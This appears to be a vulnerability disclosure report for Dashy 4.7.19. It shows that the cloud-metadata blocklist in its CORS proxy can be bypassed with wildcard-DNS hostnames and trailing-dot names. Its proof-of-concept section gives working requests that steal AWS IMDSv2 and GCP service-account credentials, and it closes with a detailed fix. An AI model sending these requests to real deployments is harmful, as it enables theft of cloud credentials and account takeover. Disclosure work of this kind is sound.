# Dashy — SSRF metadata-blocklist is bypassable, enabling cloud credential theft (IMDSv1 + IMDSv2)

**Target:** lissy93/dashy
**Version:** 4.7.19 (latest release / current `master`, commit `7fd7714`)
**Components:** `/cors-proxy` and `/status-check` (both call `validateTargetUrl` in `services/utils/request.js`)
**Class:** SSRF — security-control bypass (CWE-918)
**Severity:** High → Critical on cloud deployments (CVSS 3.1 ~8.6, `AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:L/A:N`)
**Auth required:** None on default deployments (server auth is off by default; both `requireAuth` and `requireAdmin` are no-ops when no server auth is configured — `services/app.js:203,211`). Any low-privilege / guest user otherwise (the endpoints are `requireAuth`, not `requireAdmin`).

---

## Summary

Dashy's CORS proxy is intentionally an open proxy, but it enforces **one** security control: a blocklist that blocks cloud instance-metadata endpoints (`validateTargetUrl`). The project's own tests (`tests/server/cors-proxy.test.js`) confirm this is an intended, load-bearing control — they assert that `169.254.169.254`, the decimal-encoded form, `metadata.google.internal`, Alibaba `100.100.100.200`, IPv4-mapped IPv6, and metadata redirects are all blocked.

**The control is a hostname string blocklist, and it can be bypassed two ways, defeating it on every cloud provider:**

1. **Attacker-controlled DNS → metadata IP (universal, zero infrastructure).** The check compares `new URL(target).hostname` against a fixed set of strings. Any hostname that *resolves* to a metadata IP is not in that set but still connects to metadata. Public wildcard resolvers make this a one-liner:
   ```
   http://169.254.169.254.nip.io/      -> hostname "169.254.169.254.nip.io" (not blocked) -> resolves to 169.254.169.254
   http://169.254.169.254.sslip.io/    -> same
   ```
   (Or the attacker points their own domain's A record at `169.254.169.254`.) This reaches **AWS, Azure, GCP, Oracle, DigitalOcean** metadata — anything at `169.254.169.254`. The IP-literal normalization that correctly defeats the decimal/hex/IPv6 tricks does nothing here, because the hostname is a real DNS name.

2. **Trailing-dot FQDN (GCP's named host).** The blocklist contains the DNS name `metadata.google.internal`. A trailing dot (or `%2e`) is transparent to DNS resolvers but not equal as a string:
   ```
   http://metadata.google.internal./   -> hostname "metadata.google.internal." (not blocked) -> resolves to 169.254.169.254
   http://metadata.google.internal%2e/ -> same
   ```

**Root cause:** a blocklist keyed on hostname *strings* can never defend against SSRF, because the attacker controls the hostname→IP mapping (and the parser's string form). The only correct defense is to resolve the host and check the *resolved IP* against denied ranges, then pin the connection to that IP.

### Impact is amplified two ways

- **IMDSv2 is also defeated.** AWS IMDSv2 (the SSRF-hardened default) requires a `PUT` to mint a session token and a custom token header on the `GET`. The proxy forwards **arbitrary methods and arbitrary request headers** (`CustomHeaders`), and makes a direct single-hop request (no `X-Forwarded-For`), so an attacker performs the full `PUT`-then-`GET` token dance through the proxy. The common assumption that "IMDSv2 mitigates SSRF" does **not** hold here.
- **Full response exfiltration, unauthenticated.** The proxy returns the upstream response body to the caller, so stolen tokens/credentials come straight back. On the default zero-auth deployment this needs no authentication at all.

### Impact chain

Unauthenticated HTTP request to a Dashy instance on any cloud → read instance metadata → steal the VM/role/service-account credentials (IMDSv1 or IMDSv2) → authenticate to the cloud provider's APIs with the instance's IAM identity → access/exfiltrate resources, and potentially full project/account compromise depending on the attached role.

---

## Proof of concept (all run the real shipped 4.7.19 modules)

`localtest.me.` / `169.254.169.254.nip.io` are public hostnames; the first resolves to `127.0.0.1` (used to drive a local mock metadata server), the second resolves to the real `169.254.169.254`.

**A. The live control accepts every bypass** (real `validateTargetUrl`):
```
http://169.254.169.254/              -> BLOCKED
http://169.254.169.254.nip.io/       -> ALLOWED
http://169.254.169.254.sslip.io/     -> ALLOWED
http://metadata.google.internal/     -> BLOCKED
http://metadata.google.internal./    -> ALLOWED   (trailing dot)
http://metadata.google.internal%2e/  -> ALLOWED   (encoded dot)
```

**B. DNS treats the bypass names as the protected IP** (`dns.resolve4`):
```
169.254.169.254.nip.io   -> ["169.254.169.254"]
example.com  vs  example.com.   -> identical address sets  (trailing dot is transparent)
```

**C. GCP metadata token exfiltrated through the real `/cors-proxy` handler** — attacker sends
`Target-URL: http://<metadata-host>.:PORT/computeMetadata/v1/instance/service-accounts/default/token`
and `CustomHeaders: {"Metadata-Flavor":"Google"}`:
```
cors-proxy responded with HTTP 200
body: {"access_token":"ya29.SERVICE_ACCOUNT_TOKEN","expires_in":3599}
```

**D. AWS IMDSv2 defeated through the real `/cors-proxy` handler** (two proxied calls):
```
[1] PUT  /latest/api/token               -> 200  token = AQAE-IMDSV2-SESSION-TOKEN
[2] GET  iam/security-credentials/role   -> 200
    {"AccessKeyId":"ASIA_STOLEN","SecretAccessKey":"secret/stolen","Token":"FwoG...","Code":"Success"}
```

PoC scripts saved in the scratchpad (`poc.js`, `poc2.js`, `poc3.js`, `poc4.js`). Against a real AWS target the request is simply:
```
# 1) mint IMDSv2 token
GET /cors-proxy
Target-URL: http://169.254.169.254.nip.io/latest/api/token
CustomHeaders: {"X-aws-ec2-metadata-token-ttl-seconds":"21600"}
# then 2) read role creds, presenting the returned token
GET /cors-proxy
Target-URL: http://169.254.169.254.nip.io/latest/meta-data/iam/security-credentials/<role>
CustomHeaders: {"X-aws-ec2-metadata-token":"<token-from-step-1>"}
```
GCP one-shot (IMDSv1-style):
```
GET /cors-proxy
Target-URL: http://metadata.google.internal./computeMetadata/v1/instance/service-accounts/default/token
CustomHeaders: {"Metadata-Flavor":"Google"}
```

---

## Suggested fix

Stop matching on hostname strings. Resolve the target and vet the **resolved IP(s)**, then pin the socket to a vetted address:

1. `dns.lookup(host, { all: true })`; reject if **any** resolved address is in a denied range: `169.254.0.0/16` (link-local, incl. all cloud metadata and AWS IPv6 `fd00:ec2::/…`), `127.0.0.0/8`, `::1`, `10/8`, `172.16/12`, `192.168/16`, `100.64/10`, `fc00::/7`, `fe80::/10` — as policy dictates (the proxy may still intend to allow general internal hosts, but metadata/link-local must be denied).
2. Connect to the vetted IP directly (set `lookup`/`host` to the resolved address, keep SNI/Host for TLS), closing DNS-rebinding/TOCTOU — re-resolution between check and connect currently reopens the hole.
3. As defense-in-depth, also normalize the host (strip trailing dots, decode) and add regression tests for `*.nip.io`, trailing-dot, and `%2e` forms. Normalization alone is **not** sufficient — only resolved-IP checking closes case (1).

Apply the same fix to `/status-check`, which shares `validateTargetUrl`.

---

## What else was reviewed (ruled out, for the triager's confidence)

- **`pingman` command injection:** not exploitable — pingman 2.2.0 uses `child_process.spawn(cmd, argsArray)` (no shell) and passes the host as a trailing argv element. No shell metacharacter injection.
- **REST API (`/api`):** sound — opt-in via `ENABLE_API`, bearer token compared with `crypto.timingSafeEqual`, filenames constrained to a basename + `\.ya?ml$` (no path traversal).
- **OIDC/Keycloak server verification:** sound — `jose.jwtVerify` with issuer + audience + remote JWKS.
- **Unauthenticated `/config/save` on zero-auth deploys:** intended per the maintainer's own comment ("keep zero-auth deployments open — their original behaviour"), so reported only as context, not as a separate bug.

---

## Reporting path (per the project's SECURITY.md)

- GitHub private advisory: https://github.com/lissy93/dashy/security/advisories/new
- or email `security@as93.net` (PGP `E10EE533A8E5D6F6E231BBCD4C8DEAFFCE3B8D03`)
- Policy: 30 days before public disclosure; maintainer credits reporters in release notes. GitHub is a CNA, so an accepted advisory can carry a CVE.
